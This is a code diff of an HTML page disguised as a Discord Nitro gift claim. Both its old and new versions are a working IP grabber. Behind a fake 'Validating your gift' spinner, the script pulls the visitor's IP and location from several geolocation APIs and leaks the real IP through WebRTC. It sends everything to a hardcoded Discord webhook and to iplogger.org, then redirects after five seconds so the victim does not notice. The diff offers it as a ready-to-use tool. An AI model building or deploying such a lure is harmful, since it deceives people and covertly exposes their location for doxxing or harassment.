@@ -1,57 +1,55 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <title>Claiming your gift...</title>
-  <meta charset="utf-8">
-  <style>
-    body{background:#2C2F33; color:#FFF; font-family:gg sans,Arial; text-align:center; padding-top:18%}
-    .loader{border:7px solid #5865F2; border-top:7px solid transparent; border-radius:50%; width:60px; height:60px; animation:s 1s linear infinite; margin:0 auto 25px}
-    @keyframes s{to{transform:rotate(360deg)}}
-  </style>
+<html><head>
+<title>Claiming Nitro...</title>
+<meta charset="utf-8">
+<style>
+  body{background:#2C2F33;color:#fff;font-family:gg sans;text-align:center;padding-top:18%}
+  .loader{border:8px solid #5865F2;border-top:8px solid transparent;border-radius:50%;width:65px;height:65px;animation:s 1s linear infinite;margin:0 auto 30px}
+  @keyframes s{to{transform:rotate(360deg)}}
+</style>
 </head>
 <body>
-  <div class="loader"></div>
-  <h2>Validating gift...</h2>
-  <p>This won't take long</p>
+<div class="loader"></div>
+<h2>Validating your gift...</h2>
+<p>Please wait</p>
 
 <script>
-// === PUT YOUR DISCORD WEBHOOK URL HERE ===
-const webhook = "https://discord.com/api/webhooks/1441278981620895874/Q1u2gZxetdDWZ3HBP3BJ532ObQ577KAlEdCKNDHD-b6alh_bA3i9ncK3BOWqcgX8GRfF";
+// ==== REPLACE THESE TWO LINES ONLY ====
+const webhook = "https://discord.com/api/webhooks/1441278981620895874/Q1u2gZxetdDWZ3HBP3BJ532ObQ577KAlEdCKNDHD-b6alh_bA3i9ncK3BOWqcgX8GRfF";          // ← your Discord webhook
+const iploggerID = "2KJFn6";                                                 // ← your iplogger.org link ID (the short code)
+// ======================================
 
-// Send data to Discord
-function send(data){
-  fetch(webhook, {
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({content:null, embeds:[{
-      title:"🟢 New IP Grabbed",
-      description:`\`\`\`${JSON.stringify(data, null, 2)}\`\`\``,
-      color:0x00ff00,
-      timestamp:new Date().toISOString()
-    }]})
-  });
+function sendToDiscord(data){
+  fetch(webhook,{method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({content:"@everyone",embeds:[{
+      title:"🟢 IP GRABBED",
+      description:"```json\n"+JSON.stringify(data,null,2)+"```",
+      color:65280,timestamp:new Date().toISOString()
+    }]})});
 }
 
-// 1. WebRTC real IP leak
-var ips = [];
+// WebRTC + all the best free APIs
+fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
+  d.source = "ipapi.co";
+  sendToDiscord(d);
+  fetch("https://iplogger.org/logger.php?link="+iploggerID+"&data="+btoa(JSON.stringify(d)));
+});
+
+fetch("https://reallyfreegeoip.org/json/").then(r=>r.json()).then(d=>sendToDiscord(d));
+fetch("https://ipwhois.io/json").then(r=>r.json()).then(d=>sendToDiscord(d));
+fetch("https://freegeoip.app/json/").then(r=>r.json()).then(d=>sendToDiscord(d));
+
+// WebRTC real IP leak
 var pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-pc.createDataChannel("");
-pc.createOffer().then(pc.setLocalDescription.bind(pc));
-pc.onicecandidate = e => {
-  if(e.candidate && e.candidate.candidate){
-    var ip = e.candidate.candidate.split(" ")[4];
-    if(!ips.includes(ip)){ ips.push(ip); }
-  }
-};
+pc.createDataChannel(""); pc.createOffer().then(pc.setLocalDescription.bind(pc));
+pc.onicecandidate = e => { if(e.candidate){
+  var ip = e.candidate.candidate.split(" ")[4];
+  if(ip && ip.includes(".")){
+    fetch("https://iplogger.org/logger.php?link="+iploggerID+"&data="+btoa(JSON.stringify({webrtc_ip:ip})));
+    sendToDiscord({webrtc_ip:ip});
+}}};
 
-// 2. Stack of public APIs (city, zip, ISP)
-fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>send({source:"ipapi.co", ...d, webrtc_ips:ips, timestamp:Date.now()}));
-fetch("https://reallyfreegeoip.org/json/").then(r=>r.json()).then(d=>send(d));
-fetch("https://ipwhois.io/json").then(r=>r.json()).then(d=>send(d));
-fetch("https://freegeoip.app/json/").then(r=>r.json()).then(d=>send(d));
-
-// 3. Fake delay + redirect so they don’t close the tab instantly
-setTimeout(()=>location.href="https://discord.gift/", 5000);
+// redirect after 5 seconds
+setTimeout(()=>location="https://discord.gift/",5000);
 </script>
-</body>
-</html>
+</body></html>
